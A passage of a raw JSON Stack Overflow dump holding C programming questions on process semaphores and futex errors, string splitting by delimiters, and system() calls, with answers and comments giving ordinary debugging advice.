3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1545832020, "post_id": 53932717, "comment_id": 94706149, "body": "@AndrewHenle Pretty sure the pass-by-value &quot;works&quot; because the semaphores are bogus anyway, considering they are not allocated in shared memory."}, {"owner": {"reputation": 33, "user_id": 6649332, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/vuYdx.png?s=128&g=1", "display_name": "AQUATH", "link": "https://stackoverflow.com/users/6649332/aquath"}, "edited": false, "score": 0, "creation_date": 1545832248, "post_id": 53932717, "comment_id": 94706236, "body": "@Andrew Henle Yes indeed. I changed my semaphores initialization to 0 and added a second wait signal on func4 and func5 but they are never called."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1545833061, "post_id": 53932717, "comment_id": 94706529, "body": "@EOF That too.  I missed that, and it would need to be addressed to create fully-working code."}, {"owner": {"reputation": 33, "user_id": 6649332, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/vuYdx.png?s=128&g=1", "display_name": "AQUATH", "link": "https://stackoverflow.com/users/6649332/aquath"}, "edited": false, "score": 0, "creation_date": 1545833520, "post_id": 53932717, "comment_id": 94706675, "body": "I did some basic printf-debugging, the problem is that both func1 and func2 increase s1 to 1, locally, therefore s1 is never 2 and &quot;D4&quot; is never printed. Same thing applies to func5."}], "tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": true, "score": 3, "last_activity_date": 1545833582, "last_edit_date": 1545833582, "creation_date": 1545830726, "answer_id": 53932717, "question_id": 53932013, "link": "https://stackoverflow.com/questions/53932013/how-to-find-what-causes-the-futex-facility-to-fail/53932717#53932717", "title": "How to find what causes the futex facility to fail?", "body": "<p>You're passing the semaphores by <em>value</em>, which is incorrect, as the <code>sem_t</code> variable in each function is a <em>copy</em> of the original.  (That's why functions such as <code>sem_init()</code>, <code>sem_post()</code>, and <code>sem_wait()</code> all take <em>addresses</em> of the semaphore as an argument.)</p>\n\n<p>You need to pass the semaphores by <em>address</em>, so each function operates on the original semaphores:</p>\n\n<pre><code>void func1(sem_t *sem1, sem_t *sem2);\nvoid func2(sem_t *sem1, sem_t *sem2);\nvoid func3(sem_t *sem1, sem_t *sem2);\nvoid func4(sem_t *sem1, sem_t *sem2);\nvoid func5(sem_t *sem1, sem_t *sem2);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void (*arr[5])(sem_t *, sem_t *) = {func1, func2, func3, func4, func5};\n</code></pre>\n\n<p>And call the function as:</p>\n\n<pre><code>        arr[i](&amp;s1, &amp;s2);\n</code></pre>\n\n<p>The functions should then take the form:</p>\n\n<pre><code>void func1(sem_t *sem1, sem_t *sem2) {\n    system(\"echo D1\");\n    sem_post(sem1);\n}\n</code></pre>\n\n<p>Note that the address passed to <code>func1()</code> is passed directly to <code>sem_post()</code>.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>As others have noted, you're initializing the semaphores incorrectly.  You can't initialize a semaphore to a negative value.</p>\n\n<p><strong>Proper shared semaphores</strong></p>\n\n<p>As noted in the comments, the semphores aren't in memory shared between the multiple processes.</p>\n\n<p>One way to put the semphores in shared memory is to use <code>mmap()</code>:</p>\n\n<pre><code>#include &lt;sys/mman.h&gt;\n\nint main() {\n    ...\n    // map a 4k page of shared memory (assumes a sem_t is small\n    // enough to fit at least two)\n    void *sharedMem = mmap( 0, 4 * 1024, PROT_READ | PROT_WRITE,\n        MAP_SHARED | MAP_ANONYMOUS, -1, 0 );\n\n    // use the mmap()'d memory as shared semphores\n    sem_t *semArray = ( sem_t * ) sharedMem;\n\n    // initialize the semaphores\n    sem_init( &amp;( semArray[ 0 ] ), 1, 0 );\n    sem_init( &amp;( semArray[ 1 ] ), 1, 0 );\n</code></pre>\n\n<p>The calling code becomes</p>\n\n<pre><code>    arr[i](&amp;( semArray[ 0 ] ), &amp;( semArray[ 1 ] ));\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 6649332, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/vuYdx.png?s=128&g=1", "display_name": "AQUATH", "link": "https://stackoverflow.com/users/6649332/aquath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1535, "favorite_count": 0, "accepted_answer_id": 53932717, "answer_count": 2, "score": 2, "last_activity_date": 1545833582, "creation_date": 1545826637, "last_edit_date": 1545830433, "question_id": 53932013, "link": "https://stackoverflow.com/questions/53932013/how-to-find-what-causes-the-futex-facility-to-fail", "title": "How to find what causes the futex facility to fail?", "body": "<p>I am trying to synchronize 5 processes, they have to be created from the same father.</p>\n\n<p>I tried inserting 5 waitpids to wait for the child process to end, but the code never reaches D4 and D5.</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;semaphore.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\n\n\nvoid func1(sem_t sem1, sem_t sem2);\nvoid func2(sem_t sem1, sem_t sem2);\nvoid func3(sem_t sem1, sem_t sem2);\nvoid func4(sem_t sem1, sem_t sem2);\nvoid func5(sem_t sem1, sem_t sem2);\n\nint main() {\n    sem_t s1;\n    sem_t s2;\n\n    sem_init(&amp;s1, 1, -1);\n    sem_init(&amp;s2, 1, -1);\n\n    void (*arr[5])(sem_t, sem_t) = {func1, func2, func3, func4, func5};\n\n    int pid;\n\n    for (int i=0; i&lt;5; i++) {\n        pid = fork();\n        if (pid == 0) {\n            arr[i](s1, s2);\n            break;\n        }\n    }\n\n    return 0;\n}\n\n\nvoid func1(sem_t sem1, sem_t sem2) {\n    system(\"echo D1\");\n    sem_post(&amp;sem1);\n}\n\nvoid func2(sem_t sem1, sem_t sem2) {\n    system(\"echo D2\");\n    sem_post(&amp;sem1);\n}\n\nvoid func3(sem_t sem1, sem_t sem2) {\n    system(\"echo D3\");\n    sem_post(&amp;sem2);\n}\n\nvoid func4(sem_t sem1, sem_t sem2) {\n    sem_wait(&amp;sem1);\n    system(\"echo D4\");\n    sem_post(&amp;sem2);\n}\n\nvoid func5(sem_t sem1, sem_t sem2) {\n   sem_wait(&amp;sem2);\n    system(\"echo D5\");\n}\n</code></pre>\n\n<p>I expect D4 to be shown after D1 and D2, and D5 to be shown last (D3 in independent from D1,D2,D4). But my code never reaches D4 because the futex facility returns an unexpected error.</p>\n\n<p>Output:</p>\n\n<pre><code>The futex facility returned an unexpected error code.D1\nD2\nD3\n</code></pre>\n"}, {"tags": ["c", "string", "split"], "comments": [{"owner": {"reputation": 19, "user_id": 7350229, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae388001f875b6ffc37def2706978355?s=128&d=identicon&r=PG&f=1", "display_name": "Yusmen Rashidov", "link": "https://stackoverflow.com/users/7350229/yusmen-rashidov"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1545824541, "post_id": 53931556, "comment_id": 94703611, "body": "It helped but the last word is not shown now"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545824718, "post_id": 53931556, "comment_id": 94703684, "body": "Besides treating <code>delimiter</code> as a null-terminated string when it&#39;s not, there are also other things that are... Well, weird (or wrong): First of all, calling <code>fflush</code> on an input-only stream (like <code>stdin</code>) is explicitly mentioned in the C specification as <i>undefined behavior</i>. Even if some C libraries implement it, it&#39;s not portable and should be avoided. Also, since <code>sizeof(char)</code> is specified to always be <code>1</code>, the expression <code>sizeof(line)&#47;sizeof(line[0])</code> is equal to <code>sizeof(line)</code>. And what happens if <code>fileName</code> is shorter than two characters? Or longer than <code>FILENAME_MAX</code>?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545824854, "post_id": 53931556, "comment_id": 94703726, "body": "declare isDelimiter before to use it, or move its definition above its use"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 7350229, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae388001f875b6ffc37def2706978355?s=128&d=identicon&r=PG&f=1", "display_name": "Yusmen Rashidov", "link": "https://stackoverflow.com/users/7350229/yusmen-rashidov"}, "edited": false, "score": 0, "creation_date": 1545825234, "post_id": 53931737, "comment_id": 94703847, "body": "No, there is not a new line in the end of the file"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 19, "user_id": 7350229, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae388001f875b6ffc37def2706978355?s=128&d=identicon&r=PG&f=1", "display_name": "Yusmen Rashidov", "link": "https://stackoverflow.com/users/7350229/yusmen-rashidov"}, "edited": false, "score": 0, "creation_date": 1545825311, "post_id": 53931737, "comment_id": 94703871, "body": "this is why injection is not shown, your program supposes there is a delimiter after each word"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1545825722, "post_id": 53931737, "comment_id": 94704012, "body": "This is not an answer, it&#39;s a comment."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545825872, "post_id": 53931737, "comment_id": 94704062, "body": "@Someprogrammerdude I supposed it is enough for him to understand, I added more in my answer, thank you for the down vote lol"}], "tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": true, "score": 0, "last_activity_date": 1545826213, "last_edit_date": 1545826213, "creation_date": 1545825166, "answer_id": 53931737, "question_id": 53931556, "link": "https://stackoverflow.com/questions/53931556/splitting-string-by-delimiter-does-not-split-correctly/53931737#53931737", "title": "Splitting string by delimiter does not split correctly", "body": "<p>Do you have a newline at the end of your input file ?</p>\n\n<p>{edit add}</p>\n\n<p>your program supposes each word had a delimiter after it, because the word is print only when <code>isDelimiter(delimiter, line[i])</code> is true (<em>inWord</em> being not 0), so if the file contains exactly <em>Turbo direct injection</em> (last character is 'n') injection is not shown</p>\n"}, {"comments": [{"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545832403, "post_id": 53932656, "comment_id": 94706298, "body": "it is funny because you have a problem similar to Yusmen Rashidov, if the input string is not terminated by a separator the last character is lost (not the word that time except if the last word length is 1), for instance <code>mystrtok(&quot;azety qsd&quot;, &quot; &quot;, 0)</code> returns <code>{&quot;azerty&quot;, &quot;qs&quot;, 0}</code> ( <code>mystrtok(&quot;azety qsd &quot;, &quot; &quot;, 0)</code> returns <code>{&quot;azerty&quot;, &quot;qsd&quot;, 0}</code> )"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545832890, "post_id": 53932656, "comment_id": 94706461, "body": "Additional remark, why to return NULL if <i>str</i> length is 1 ? it seems more practical if <code>mystrtok(&quot;a&quot;, &quot; &quot;, 0)</code> returns <code>{ &quot;a&quot;, 0}</code> no ?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545834370, "post_id": 53932656, "comment_id": 94706926, "body": "Yep. sorted               -----------------"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545834985, "post_id": 53932656, "comment_id": 94707104, "body": "I see you very like the &#39;!&#39; :-) In <code>extrachar = !extrachar * !*(end + 1);</code> to use a &#39;*&#39; for a <i>and</i> seems expensive no ?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545837422, "post_id": 53932656, "comment_id": 94707892, "body": "@bruno No. For two reasons: 1. the generated code will not <code>multiply</code> or <code>and</code> the results. 2. Even if it will multiply integer multiplication on all modern platforms (including 8 bits AVR uCs) is same fast as <code>and</code>. This time your comment is 100% wrong"}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": -1, "last_activity_date": 1545836372, "last_edit_date": 1545836372, "creation_date": 1545830356, "answer_id": 53932656, "question_id": 53931556, "link": "https://stackoverflow.com/questions/53931556/splitting-string-by-delimiter-does-not-split-correctly/53932656#53932656", "title": "Splitting string by delimiter does not split correctly", "body": "<pre><code>char **mystrtok(const char *str, const char *del, int alowempty)\n{\n  char **result = NULL;\n  const char *end = str;\n  size_t size = 0;\n  int extrachar;\n\n  while(*end)\n  {\n    if((extrachar = !!strchr(del, *end)) || !*(end + 1))\n    {\n        /* add temp variable and malloc / realloc checks */\n        /* free allocated memory on error */\n        if(!(!alowempty &amp;&amp; !(end - str)))\n        {\n            extrachar = !extrachar * !*(end + 1);\n            result = realloc(result, (++size + 1) * sizeof(*result));\n            result[size] = NULL;\n            result[size -1] = malloc(end - str + 1 + extrachar);\n            strncpy(result[size -1], str, end - str + extrachar);\n            result[size -1][end - str + extrachar] = 0;\n        }\n        str = end + 1;\n    }\n    end++;\n  }\n  return result;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 341, "user_id": 8295671, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/567e7c3cca19a2b988aaf7df7b0a70a9?s=128&d=identicon&r=PG&f=1", "display_name": "concurrencyboy", "link": "https://stackoverflow.com/users/8295671/concurrencyboy"}, "edited": false, "score": 0, "creation_date": 1546874197, "post_id": 53933761, "comment_id": 94987288, "body": "Sir, I&#39;ve seen your lots of brilliant answers. Could you look at <a href=\"http://t1p.de/xu1t\" rel=\"nofollow noreferrer\">t1p.de/xu1t</a>     ??"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1545838782, "last_edit_date": 1545838782, "creation_date": 1545836849, "answer_id": 53933761, "question_id": 53931556, "link": "https://stackoverflow.com/questions/53931556/splitting-string-by-delimiter-does-not-split-correctly/53933761#53933761", "title": "Splitting string by delimiter does not split correctly", "body": "<p>The main problem is the <code>delimiter</code> character array is not a proper C string: you must add an explicit null byte at the end of the initializer:</p>\n\n<pre><code>    char delimiter[] = { '[', ']', '(', ')', ';', '!', '=', '&gt;', '&lt;',\n        '|', '*', '/', ':', '&amp;', '%', ' ', '\\n', '\\t', '\"', '{', '}',\n        ',', '-', '+', '#', '\\0' };\n</code></pre>\n\n<p>Alternately, you could use a string constant:</p>\n\n<pre><code>    char delimiter[] = \"[]();!=&gt;&lt;|*/:&amp;% \\n\\t\\\"{},-+#\";\n</code></pre>\n\n<p>There are many more issues in your code:</p>\n\n<ul>\n<li><p><code>flush(stdin)</code> has undefined behavior. If you mean to discard pending input from a previous call to <code>scanf()</code>, use an explicit loop.</p></li>\n<li><p>you should strip the trailing newline from <code>fileName</code> but not assume it is present. Use this one liner for example:</p>\n\n<pre><code>fileName(strcspn(fileName, \"\\n\")] = '\\0';\n</code></pre></li>\n<li><p>you should verify the string length before accessing characters from the end. As coded, you have undefined behavior if the user enters a single character before the newline. First strip the newline then use this:</p>\n\n<pre><code>size_t len = strlen(fileName);\nif (len &lt; 3 || fileName[len - 2] != '.' || fileName[len - 1] != 'c') {\n    printf(\"\\nInvalid source file name\\n\");\n    return;\n}\n</code></pre></li>\n<li><p>There is no need for <code>sizeof(line) / sizeof(line[0])</code>, <code>char</code> is <code>1</code> by definition in C.</p></li>\n<li><p>testing for <code>ferror(filePointer)</code> is meaningless if <code>fgets()</code> returns a valid pointer.</p></li>\n<li><p>You must increment <code>i</code> by 2 when matching <code>/*</code> otherwise you will misinterpret the sequence <code>/*/</code>, furthermore, you should not keep scanning inside the comment for <code>//</code> and/or string delimiters.</p></li>\n<li><p>you must break from the loop if matching <code>//</code> for the same reasons.</p></li>\n<li><p>if you are inside a string, you should recognise <code>\\</code> as an escape character and accept <code>\\\"</code> as part of the string. Furthermore, you should not scan for comments inside a string.</p></li>\n<li><p>the same remark for character constants.</p></li>\n<li><p>you may have buffer overflows if the file contains very long identifiers (> 99 chars), including inside comments or strings.</p></li>\n<li><p>you forget to close the source file</p></li>\n</ul>\n"}], "owner": {"reputation": 19, "user_id": 7350229, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae388001f875b6ffc37def2706978355?s=128&d=identicon&r=PG&f=1", "display_name": "Yusmen Rashidov", "link": "https://stackoverflow.com/users/7350229/yusmen-rashidov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 109, "favorite_count": 0, "accepted_answer_id": 53931737, "answer_count": 3, "score": 2, "last_activity_date": 1545914830, "creation_date": 1545824225, "last_edit_date": 1545914830, "question_id": 53931556, "link": "https://stackoverflow.com/questions/53931556/splitting-string-by-delimiter-does-not-split-correctly", "title": "Splitting string by delimiter does not split correctly", "body": "<p>I have a function that has to spilt a line read from file into words by some delimiters (delimiters check is made by another function) but my code splits the string by delimiters which are not included in the delimiters' list [an array of delimiters]:</p>\n\n<pre><code>void getIdentifiers() {\n    FILE *filePointer;\n    char fileName[FILENAME_MAX], line[256], identifier[100];\n\n    char delimiter[] = {\n        '[', ']', '(', ')', ';', '!', '=', '&gt;', '&lt;', '|', '*', '/', ':',\n        '&amp;', '%', ' ', '\\n', '\\t', '\"', '{', '}', ',', '-', '+', '#' };\n\n    int cnt = 0, inWord = 0, isString = 0, isSingleLineComment = 0, isMultiComment = 0, isChar = 0;\n\n    printf(\"\\n Enter filename:\\n\");\n    flush(stdin);\n\n    if (!fgets(fileName, FILENAME_MAX, stdin)) {\n        printf(\"\\nError reading filename\");\n        return;\n    }\n\n    if (fileName[strlen(fileName) - 2] != 'c' || fileName[strlen(fileName) - 3] != '.') {\n        printf(\"\\nInvalid source file name\\n\");\n        return;\n    }\n\n    fileName[strlen(fileName) - 1] = '\\0';\n\n    filePointer = fopen(fileName, \"r\");\n\n    if (filePointer == NULL) {\n        printf(\"\\nError opening file\");\n        return;\n    }\n\n    while (fgets(line, sizeof(line) / sizeof(line[0]), filePointer) != NULL) {\n        if (ferror(filePointer)) {\n            printf(\"\\nError reading the file\");\n            return;\n        }\n\n        int i = 0, j = 0;\n\n        while (line[i]) {\n            //multi line comment check\n            if (line[i] == '/' &amp;&amp; line[i + 1] == '*')\n                isMultiComment = 1;\n\n            //single line comment\n            if (line[i] == '/' &amp;&amp; line[i + 1] == '/')\n                isSingleLineComment = 1;\n\n            //ending multi line comment\n            if (line[i] == '*' &amp;&amp; line[i + 1] == '/' &amp;&amp; isMultiComment == 1) \n                isMultiComment = 0;\n\n            //checking for string\n            if (line[i] == '\"' &amp;&amp; isString == 0)\n                isString = 1;\n            else if (line[i] == '\"' &amp;&amp; isString == 1)\n                isString = 0;\n\n            //check if assignment char is in quote\n            if (line[i] == '\\'' &amp;&amp; isChar == 0) \n                isChar = 1;\n            else if (line[i] == '\\'' &amp;&amp; isChar == 1)\n                isChar = 0;\n\n            //splitting textline into words\n            if (inWord==0) {\n                if (!isDelimiter(delimiter, line[i])) {\n                    inWord = 1;\n                    identifier[j] = line[i];\n                    j++;\n                } else {\n                    i++;\n                    continue;\n                }\n            } else {\n                //ending word\n                if (isDelimiter(delimiter, line[i])) {\n                    inWord = 0;\n                    identifier[j] = 0;\n                    j = 0;\n\n                    // identifier checking\n                    if (!isString &amp;&amp; !isMultiComment &amp;&amp; !isSingleLineComment \n                        &amp;&amp; !isChar) {\n                        cnt++;\n                        printf(\"\\n%s\", identifier);\n                    }\n                } else {\n                    identifier[j] = line[i];\n                    j++;\n                }\n            }\n            i++;\n        }\n        isSingleLineComment = 0;\n    }\n    printf(\"\\n Number of identifiers is  %d\", cnt);\n}\n\nint isDelimiter(char *delim, char c) {\n    int i = 0;\n    while (delim[i]) {\n        if (delim[i] == c)\n            return 1;\n        i++;\n    }\n    return 0;\n}\n</code></pre>\n\n<p>The file that I try to read contains:</p>\n\n<pre><code>Turbo direct injection\n</code></pre>\n\n<p>The expected output is:</p>\n\n<pre><code>Turbo\ndirect\ninjection\n</code></pre>\n\n<p>But I got:</p>\n\n<pre><code>Turbo\ndi\nect\ninject\no\n</code></pre>\n"}, {"tags": ["c", "system"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1545823586, "post_id": 53931395, "comment_id": 94703312, "body": "<code>char cmd[] = &quot;echo hello&quot;;</code>"}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545823780, "post_id": 53931395, "comment_id": 94703381, "body": "@wildplasser not working!"}, {"owner": {"reputation": 21239, "user_id": 1078, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/qS3O8.jpg?s=128&g=1", "display_name": "John Sibly", "link": "https://stackoverflow.com/users/1078/john-sibly"}, "edited": false, "score": 0, "creation_date": 1545823790, "post_id": 53931395, "comment_id": 94703386, "body": "How are you calling foo?"}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 21239, "user_id": 1078, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/qS3O8.jpg?s=128&g=1", "display_name": "John Sibly", "link": "https://stackoverflow.com/users/1078/john-sibly"}, "edited": false, "score": 0, "creation_date": 1545823952, "post_id": 53931395, "comment_id": 94703438, "body": "@JohnSibly this is just an abstract part of my huge codes! there are some backtraces to calling this function, but I am sure that before calling system() the value of <code>a</code> is valid, but after calling that it&#39;s not!"}, {"owner": {"reputation": 3800, "user_id": 9035237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34bf4b56e66db99e1e713299fa0df413?s=128&d=identicon&r=PG&f=1", "display_name": "Geno Chen", "link": "https://stackoverflow.com/users/9035237/geno-chen"}, "edited": false, "score": 0, "creation_date": 1545823958, "post_id": 53931395, "comment_id": 94703442, "body": "Using C4Droid (in Android), getting the same address (that is, not able to reproduce the question)."}, {"owner": {"reputation": 3800, "user_id": 9035237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34bf4b56e66db99e1e713299fa0df413?s=128&d=identicon&r=PG&f=1", "display_name": "Geno Chen", "link": "https://stackoverflow.com/users/9035237/geno-chen"}, "edited": false, "score": 0, "creation_date": 1545824213, "post_id": 53931395, "comment_id": 94703521, "body": "Using GCC 4.8.4 (Ubuntu 14.04, Linux 3.13), still can&#39;t reproduce."}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 3800, "user_id": 9035237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34bf4b56e66db99e1e713299fa0df413?s=128&d=identicon&r=PG&f=1", "display_name": "Geno Chen", "link": "https://stackoverflow.com/users/9035237/geno-chen"}, "edited": false, "score": 0, "creation_date": 1545824231, "post_id": 53931395, "comment_id": 94703527, "body": "@GenoChen C4Droid?! I&#39;m just running a simple example on linux via C; no android-kind inserted! :)"}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545824305, "post_id": 53931395, "comment_id": 94703552, "body": "@Arkku so I remove [10] to clarify my abstraction"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545824332, "post_id": 53931395, "comment_id": 94703560, "body": "@mohamadrez&#224; Now your &quot;abstraction&quot; is useless because it doesn&#39;t have the problem described. Please read <a href=\"https://stackoverflow.com/help/mcve\">stackoverflow.com/help/mcve</a>"}, {"owner": {"reputation": 3800, "user_id": 9035237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34bf4b56e66db99e1e713299fa0df413?s=128&d=identicon&r=PG&f=1", "display_name": "Geno Chen", "link": "https://stackoverflow.com/users/9035237/geno-chen"}, "edited": false, "score": 0, "creation_date": 1545824391, "post_id": 53931395, "comment_id": 94703575, "body": "@mohamadrez&#224; I just have an Android phone currently :-D Then SSH into a server to test. C4Droid is a simple &quot;IDE&quot; for C in Android."}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 3800, "user_id": 9035237, "user_type": "registered", "profile_image": 